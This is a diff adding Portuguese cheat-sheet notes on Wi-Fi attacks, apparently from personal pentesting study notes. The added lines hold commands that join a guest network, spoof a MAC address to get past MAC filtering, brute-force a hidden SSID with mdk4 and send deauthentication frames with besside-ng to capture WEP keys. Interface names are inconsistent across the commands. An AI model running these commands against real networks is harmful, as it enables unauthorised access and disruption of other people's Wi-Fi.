@@ -5360,6 +5360,35 @@ Faz um bruteforce da senha wpa capturada.
 
 Vai gerar um arquivo para ler no wireshark
 
+	network={
+			ssid="visitantes"
+			key_mgmt=NONE
+	}
+
+Criando o arquivo para se conectar à rede `wifi.conf`
+
+	sudo wpa_supplicant -Dnl80211 -iwlan2 -c visitantes.conf
+
+Usando o arquivo para se conectar à rede - pode ser com uma rede disponivel OU com uma rede em monitoramento, como abaixo, para capturar pacotes dentro dessa rede
+
+	sudo airmon-ng start wlan1
+	sudo ip link set wlan1mon down
+	sudo macchanger -m CC:D0:83:B0:78:88 -p wlan2mon
+	sudo ip link set wlan1mon up
+
+Caso não funcione, pode ser filtro de MAC - troca por um mac de um dispositivo já conectado usando os comandos acima
+
+	sudo wpa_supplicant -Dnl80211 -iwlan1mon -c visitantes.conf
+
+Depois conecta no wifi e ver se funciona com o novo MAC
+
+	sudo mdk4 wlan0mon p -t F0:9F:C2:71:22:56 -s 100 -f /usr/share/doc/mdk4/common-ssids.txt
+
+Attack de SSID oculto bruteforce para encontrar o SSID - Ele não vai aparecer na captura do airodump `<length:  8> ` com o comando acima, é possivel fazer a descoberta dessa rede
+
+	sudo besside-ng -c 1 -b F0:9F:C2:71:22:56 wlan0mon -v
+
+Aparentemente comando para enviar DEAUTH para capturar o WEP password
 
 THAT'S ALL FOLKS
 
